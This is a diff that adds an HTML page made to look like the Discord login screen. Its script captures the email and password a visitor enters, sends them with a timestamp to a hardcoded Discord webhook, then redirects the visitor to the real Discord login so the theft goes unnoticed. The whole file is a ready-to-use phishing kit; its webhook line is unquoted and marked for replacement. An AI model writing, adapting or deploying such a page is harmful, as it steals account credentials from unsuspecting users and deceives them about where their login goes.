@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Discord - Login</title>
+<style>
+body{background:#36393f;color:#fff;font-family:sans-serif;text-align:center;padding-top:80px;}
+input{width:280px;padding:14px;margin:8px;background:#202225;border:none;color:#fff;border-radius:4px;font-size:16px;}
+button{width:280px;padding:14px;background:#7289da;border:none;color:#fff;font-size:18px;border-radius:4px;cursor:pointer;}
+</style>
+</head>
+<body>
+<h1>Discord</h1>
+<p>Login to continue</p>
+<input id="email" placeholder="Email or Phone" type="text"><br>
+<input id="pass" placeholder="Password" type="password"><br>
+<button onclick="capture()">Log In</button>
+
+<script>
+function capture() {
+  var email = document.getElementById("email").value;
+  var pass = document.getElementById("pass").value;
+  var webhook = https://discord.com/api/webhooks/1514703286798782608/dn3EYTqJhW7BX3gF1eP6A6Z8OXUiOjO92Ani-drwSX0b0X77g5pTCK4JzTMHELrDmKdW ;  // ← REPLACE THIS
+  fetch(webhook, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({email:email, password:pass, captured_at:new Date()})
+  });
+  window.location = "https://discord.com/login";
+}
+</script>
+</body>
+</html>
